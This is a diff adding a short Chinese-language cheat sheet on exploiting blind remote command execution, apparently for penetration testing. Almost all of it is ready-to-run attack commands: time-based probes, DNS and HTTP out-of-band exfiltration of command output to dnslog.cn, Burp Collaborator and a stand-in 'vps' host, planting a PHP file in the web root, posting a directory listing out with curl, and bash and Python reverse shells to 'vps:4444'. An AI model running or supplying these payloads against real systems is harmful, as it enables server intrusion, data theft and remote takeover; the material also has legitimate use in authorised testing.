@@ -1,0 +1,45 @@
+# 无回显 RCE 利用技巧
+
+> 命令执行后页面没有任何输出时的利用方法
+
+## 1. 延时盲注（时间判断）
+```bash
+sleep 5
+ping -c 5 127.0.0.1
+```
+
+## 2. DNSLog / HTTPLog 带外
+```bash
+# DNS 外带（最快）
+curl http://`whoami`.dnslog.cn
+ping -c 1 `whoami`.dnslog.cn
+nslookup `whoami`.dnslog.cn
+
+# HTTP 外带
+curl http://your-vps:8080/`whoami`
+wget http://your-vps:8080/$(id)
+
+# 配合 burp collaborator
+nslookup $(whoami).xxxxx.burpcollaborator.net
+```
+
+## 3. 写入文件回显
+```bash
+# Linux
+echo "<?php phpinfo(); ?>" > /var/www/html/info.php
+ls -la > /tmp/out.txt && curl --data-binary @/tmp/out.txt http://vps/
+
+# Windows
+echo ^<?php phpinfo(); ?^> > C:\inetpub\wwwroot\info.php
+ipconfig > C:\temp\out.txt
+certutil -encode C:\temp\out.txt C:\temp\out.b64
+```
+
+## 4. 反弹 Shell
+```bash
+# Linux
+bash -c 'bash -i >& /dev/tcp/vps/4444 0>&1'
+
+# Python
+python3 -c "import os,pty,socket;s=socket.socket();s.connect(('vps',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('bash')"
+```
